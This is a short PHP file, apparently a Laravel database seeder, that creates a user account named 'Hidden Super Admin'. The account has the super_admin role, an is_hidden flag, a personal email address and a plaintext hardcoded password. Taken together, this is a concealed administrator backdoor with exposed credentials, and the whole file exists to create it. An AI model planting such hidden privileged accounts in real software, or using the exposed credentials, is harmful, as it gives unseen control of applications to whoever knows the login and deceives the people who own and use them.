<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use App\Models\User;
use Illuminate\Support\Facades\Hash;

class HiddenSuperAdminSeeder extends Seeder
{
    public function run(): void
    {
        User::firstOrCreate(
            ['email' => 'fitrasmkmerdeka@gmail.com'],
            [
                'name' => 'Hidden Super Admin',
                'password' => Hash::make('fr!237634118'),
                'role' => 'super_admin',
                'is_hidden' => true,
            ]
        );
    }
}
